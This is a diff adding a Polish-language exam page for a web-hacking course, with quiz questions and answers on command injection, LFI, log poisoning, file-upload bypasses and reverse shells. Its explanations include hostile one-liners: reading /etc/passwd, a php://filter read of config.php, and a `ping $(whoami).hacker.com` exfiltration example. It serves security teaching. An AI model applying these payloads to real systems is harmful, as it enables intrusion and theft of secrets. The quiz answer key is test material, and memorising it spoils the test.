@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Egzamin: Moduł 2 - Hack & Learn</title>
+    
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Akcent: TOXIC HAZARD (Green & Yellow) */
+        :root {
+            --accent: #00ff00; /* Terminal Green */
+            --accent-glow: rgba(0, 255, 0, 0.4);
+            --success: #ccff00; /* Radioactive Yellow */
+            --danger: #ff0000;
+        }
+        
+        body {
+            /* Tło "Radioactive Zone" */
+            background-image: 
+                linear-gradient(rgba(0, 20, 0, 0.9), rgba(0, 20, 0, 0.9)),
+                repeating-linear-gradient(
+                    45deg,
+                    #000,
+                    #000 10px,
+                    #0a200a 10px,
+                    #0a200a 20px
+                );
+        }
+
+        .boss-header {
+            border: 2px solid var(--accent);
+            padding: 20px;
+            text-align: center;
+            background: rgba(0, 255, 0, 0.05);
+            margin-bottom: 40px;
+            box-shadow: 0 0 30px var(--accent-glow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .boss-title {
+            font-size: 3rem;
+            color: var(--accent);
+            text-transform: uppercase;
+            font-weight: 800;
+            letter-spacing: 5px;
+            margin: 0;
+            text-shadow: 0 0 10px var(--accent);
+        }
+
+        /* Ozdobne paski ostrzegawcze */
+        .hazard-stripe {
+            height: 10px;
+            background: repeating-linear-gradient(
+                45deg,
+                #000,
+                #000 10px,
+                var(--accent) 10px,
+                var(--accent) 20px
+            );
+            margin: 20px 0;
+            border: 1px solid var(--accent);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <div class="boss-header">
+        <div class="hazard-stripe"></div>
+        <h1 class="boss-title">EGZAMIN KOŃCOWY</h1>
+        <p style="color: #fff; margin-top: 10px; font-family: var(--font-mono);">
+            /// POZIOM 2: SYSTEM & FILES ///
+        </p>
+        <div class="hazard-stripe"></div>
+    </div>
+
+    <section>
+        <h2>> STATUS MISJI</h2>
+        <p>Test wiedzy z lekcji 11-13. Tematyka: RCE, LFI, Webshelle i przejmowanie serwera.</p>
+        <div class="card" style="border-color: var(--accent);">
+            <h3>ZASADY GRY</h3>
+            <ul>
+                <li><strong>Liczba pytań:</strong> 15</li>
+                <li><strong>Wymagany wynik:</strong> 80% (12/15)</li>
+                <li><strong>Zakres:</strong> Command Injection, Path Traversal, Log Poisoning, File Upload Bypasses.</li>
+            </ul>
+        </div>
+    </section>
+
+    <!-- QUIZ -->
+    <section id="quiz-section">
+        <h2>⚔️ ROZPOCZNIJ WALKĘ</h2>
+        <div id="quiz-container"></div>
+    </section>
+
+    <footer>
+        <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Hack & Learn: Web Edition | EXAM 02</p>
+    </footer>
+</div>
+
+<!-- DANE DO EGZAMINU -->
+<script>
+    const quizData = [
+        // COMMAND INJECTION
+        {
+            question: "Co robi operator średnika ( ; ) w ataku Command Injection na systemie Linux?",
+            options: [
+                "Jest to znak komentarza.",
+                "Jest to separator poleceń, pozwalający wykonać drugą komendę (np. 'whoami') po zakończeniu pierwszej, niezależnie od jej wyniku.",
+                "Wysyła proces w tło.",
+                "Łączy dwa ciągi znaków."
+            ],
+            correct: 1,
+            explanation: "Średnik pozwala na sekwencyjne wykonywanie poleceń. `ping 8.8.8.8; id` wykona ping, a potem pokaże ID użytkownika."
+        },
+        {
+            type: "scenario",
+            question: "Masz Blind Command Injection. Nie widzisz wyniku komendy. Jak potwierdzisz, że podatność istnieje?",
+            options: [
+                "Wpiszę `ls -la` i zobaczę czy strona się zmieni.",
+                "Użyję komendy czasowej, np. `sleep 10` (lub `ping -c 10 127.0.0.1`). Jeśli strona ładuje się 10 sekund dłużej, mam RCE.",
+                "Zmienię tło strony.",
+                "Użyję `echo hello`."
+            ],
+            correct: 1,
+            explanation: "W atakach typu Blind (niewidocznych) musimy polegać na efektach ubocznych, takich jak opóźnienie czasowe (Time-Based) lub połączenie zwrotne do naszego serwera (OAST)."
+        },
+        {
+            question: "Jaka jest pierwsza komenda, którą warto wpisać po uzyskaniu RCE w środowisku chmurowym/Docker, aby znaleźć sekrety?",
+            options: [
+                "ps aux",
+                "netstat -an",
+                "env (lub printenv)",
+                "cat /etc/hosts"
+            ],
+            correct: 2,
+            explanation: "W nowoczesnych aplikacjach hasła do bazy, klucze API i tokeny są trzymane w zmiennych środowiskowych. `env` wyświetla je wszystkie naraz."
+        },
+        // PATH TRAVERSAL / LFI
+        {
+            question: "Co oznacza ciąg `../` (dot-dot-slash)?",
+            options: [
+                "Przejście do katalogu domowego użytkownika.",
+                "Przejście do katalogu nadrzędnego (wyjście w górę drzewa katalogów).",
+                "Usunięcie pliku.",
+                "Ukrycie pliku."
+            ],
+            correct: 1,
+            explanation: "To podstawa Path Traversal. `../../etc/passwd` oznacza: wyjdź dwa razy w górę i otwórz plik passwd."
+        },
+        {
+            type: "scenario",
+            question: "Próbujesz LFI: `?page=../../etc/passwd`, ale serwer dokleja `.php` na końcu, szukając `passwd.php`. Jak (w starych systemach) można było to obejść używając Null Byte?",
+            options: [
+                "Dodając %20 na końcu.",
+                "Dodając %00 na końcu (np. `passwd%00`). Powodowało to ucięcie ciągu znaków w tym miejscu.",
+                "Dodając # na początku.",
+                "Używając metody POST."
+            ],
+            correct: 1,
+            explanation: "Null Byte (%00) dla systemu operacyjnego (napisanego w C) oznacza koniec napisu. PHP widział `passwd%00.php`, ale system otwierał tylko `passwd`."
+        },
+        {
+            question: "Co to jest Log Poisoning?",
+            options: [
+                "Usunięcie logów serwera.",
+                "Technika zamiany LFI w RCE. Atakujący wstrzykuje kod PHP do logów (np. przez User-Agent), a następnie wczytuje ten log przez podatność LFI.",
+                "Zaspamowanie serwera logami (DoS).",
+                "Zmiana uprawnień plików."
+            ],
+            correct: 1,
+            explanation: "Log Poisoning to piękna technika eskalacji. Jeśli możesz czytać pliki (LFI) i możesz pisać do jakiegoś pliku (Logi), to możesz wykonać kod."
+        },
+        {
+            question: "Do czego służy wrapper `php://filter` w ataku LFI?",
+            options: [
+                "Do filtrowania adresów IP.",
+                "Pozwala odczytać kod źródłowy plików PHP (zakodowany w Base64) zamiast je wykonywać.",
+                "Do wgrywania plików.",
+                "Do szyfrowania połączenia."
+            ],
+            correct: 1,
+            explanation: "Używając `php://filter/convert.base64-encode/resource=config.php` serwer zwróci treść pliku config.php w Base64. Dekodujesz to i masz hasła."
+        },
+        // FILE UPLOAD
+        {
+            question: "Co to jest Webshell?",
+            options: [
+                "Skrypt (np. shell.php), który po wgraniu na serwer pozwala na zdalne wykonywanie komend systemowych.",
+                "Zabezpieczona powłoka SSH.",
+                "Program antywirusowy dla stron www.",
+                "Baza danych w pliku."
+            ],
+            correct: 0,
+            explanation: "Webshell to cel ataku File Upload. To mały plik, który działa jak terminal, ale przez przeglądarkę."
+        },
+        {
+            type: "scenario",
+            question: "Serwer sprawdza nagłówek `Content-Type`. Jak wgrasz plik `shell.php`?",
+            options: [
+                "Zmienię rozszerzenie na .jpg.",
+                "W Burp Suite przechwycę żądanie i zmienię `Content-Type: application/x-php` na `Content-Type: image/jpeg`, zachowując treść i rozszerzenie pliku.",
+                "Skompresuję plik do ZIP.",
+                "Wyślę plik mailem."
+            ],
+            correct: 1,
+            explanation: "Content-Type jest ustawiany przez przeglądarkę klienta. Atakujący ma nad nim pełną kontrolę i może kłamać."
+        },
+        {
+            question: "Czym są 'Magic Bytes' (np. `GIF89a`) i jak są wykorzystywane w ataku?",
+            options: [
+                "To hasło do serwera.",
+                "To pierwsze bajty pliku określające jego typ. Atakujący dodaje je na początku skryptu PHP, aby oszukać serwer, że plik jest obrazkiem (Polyglot).",
+                "To błąd w kodowaniu znaków.",
+                "To nazwa narzędzia hakerskiego."
+            ],
+            correct: 1,
+            explanation: "Serwer sprawdzający treść pliku często patrzy tylko na nagłówek. Plik zaczynający się od `GIF89a` jest traktowany jak GIF, nawet jeśli dalej ma kod PHP."
+        },
+        {
+            question: "Serwer blokuje rozszerzenie `.php`. Jakie inne rozszerzenie może zostać wykonane jako PHP na serwerze Apache (zależnie od konfiguracji)?",
+            options: [
+                ".txt",
+                ".phtml, .php5, .phar",
+                ".jpg",
+                ".html"
+            ],
+            correct: 1,
+            explanation: "Konfiguracja serwera często mapuje wiele rozszerzeń do silnika PHP. `.phtml` to klasyczny bypass."
+        },
+        // GENERAL / DEFENSE
+        {
+            question: "Jaki jest najskuteczniejszy sposób obrony przed złośliwym uploadem plików?",
+            options: [
+                "Sprawdzanie rozszerzenia.",
+                "Zapisywanie plików poza katalogiem publicznym (webroot), zmiana nazwy na losową (np. UUID) i serwowanie ich przez skrypt, a nie bezpośrednio.",
+                "Skanowanie antywirusem.",
+                "Blokowanie plików większych niż 1MB."
+            ],
+            correct: 1,
+            explanation: "Jeśli plik nie znajduje się w katalogu dostępnym z poziomu URL (np. `/uploads/`), atakujący nie ma jak go uruchomić."
+        },
+        {
+            question: "Co robi operator `$()` lub odwrotny apostrof (backtick) w ataku Command Injection?",
+            options: [
+                "To jest komentarz.",
+                "Wykonuje komendę wewnątrz nawiasów i wstawia jej wynik do głównego polecenia (Command Substitution).",
+                "Zmienia kolor tekstu.",
+                "Tworzy zmienną."
+            ],
+            correct: 1,
+            explanation: "Przykład: `ping $(whoami).hacker.com`. System najpierw wykona `whoami`, wstawi wynik (np. 'root') i wykona `ping root.hacker.com`."
+        },
+        {
+            type: "scenario",
+            question: "Udało Ci się wgrać plik `avatar.jpg`, który zawiera kod PHP w komentarzu EXIF. Ale serwer nie wykonuje go jako PHP. Czego brakuje?",
+            options: [
+                "Plik jest za duży.",
+                "Serwer musi być skonfigurowany tak, aby traktować pliki .jpg jako skrypty PHP (np. przez plik .htaccess: `AddType application/x-httpd-php .jpg`) lub musisz wykorzystać podatność LFI.",
+                "Musisz zmienić nazwę na .png.",
+                "PHP nie obsługuje EXIF."
+            ],
+            correct: 1,
+            explanation: "Kod PHP w obrazku jest bezpieczny, dopóki serwer nie przekaże go do interpretera PHP. Bez LFI lub zmiany konfiguracji serwera, kod się nie wykona."
+        },
+        {
+            question: "Czym jest Reverse Shell?",
+            options: [
+                "Zdalnym pulpitem.",
+                "Techniką, gdzie serwer ofiary łączy się ZWROTNIE do komputera atakującego (omijając firewall blokujący połączenia przychodzące) i udostępnia powłokę.",
+                "Narzędziem do robienia kopii zapasowej.",
+                "Skryptem odwracającym kolejność liter."
+            ],
+            correct: 1,
+            explanation: "Najskuteczniejsza metoda utrzymania dostępu. Serwer 'dzwoni do domu' (do hakera), co zazwyczaj jest dozwolone przez reguły Firewall Egress."
+        }
+    ];
+</script>
+
+<script src="quiz.js"></script>
+
+</body>
+</html>
